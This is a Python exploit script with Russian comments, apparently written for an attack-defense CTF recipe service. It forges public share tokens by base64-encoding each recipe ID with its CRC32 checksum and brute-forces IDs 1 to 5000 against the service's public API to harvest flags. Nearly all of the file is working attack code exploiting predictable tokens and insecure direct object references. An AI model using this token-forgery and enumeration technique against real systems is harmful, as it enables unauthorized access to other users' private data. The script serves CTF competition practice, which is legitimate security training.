#!/usr/bin/env python3
import sys
import base64
import zlib
import re
import requests

TIMEOUT = 5
FLAG_RE = re.compile(r'[A-Z0-9]{31}=')


def make_public_token(recipe_id):
    """
    Подделка публичного токена через CRC32.
    Формат: base64(recipeID:crc32_hex)
    """
    id_str = str(recipe_id)
    crc = zlib.crc32(id_str.encode()) & 0xffffffff
    raw = f"{id_str}:{crc:x}".encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip('=')


def exploit(host, port):
    """
    Перебирает recipeID от 1 до 5000, генерирует токены,
    получает рецепты через /api/public/{token} и ищет флаги.
    """
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    flags = []
    
    print(f"[*] Эксплуатация {base_url}")
    print(f"[*] Перебор recipe ID 1-5000...")
    
    for recipe_id in range(1, 5001):
        token = make_public_token(recipe_id)
        url = f"{base_url}/api/public/{token}"
        
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                try:
                    data = r.json()
                    recipe_text = data.get("recipe", "")
                    dish_name = data.get("dish_name", "")
                    
                    # Ищем флаги в рецепте
                    found_flags = FLAG_RE.findall(recipe_text)
                    for flag in found_flags:
                        if flag not in flags:
                            flags.append(flag)
                            print(f"[+] ID {recipe_id} ({dish_name}): {flag}")
                except Exception:
                    pass
        except requests.RequestException:
            pass
        
        # Прогресс каждые 500 запросов
        if recipe_id % 500 == 0:
            print(f"[*] Проверено: {recipe_id}/5000 | Найдено флагов: {len(flags)}")
    
    print(f"\n[*] Готово! Найдено флагов: {len(flags)}")
    for flag in flags:
        print(flag)
    
    return flags


def main():
    if len(sys.argv) < 3:
        print("Usage: sploit.py HOST PORT")
        print("Example: sploit.py localhost 8080")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    flags = exploit(host, port)
    
    if not flags:
        print("[!] Флаги не найдены")
        sys.exit(1)


if __name__ == "__main__":
    main()
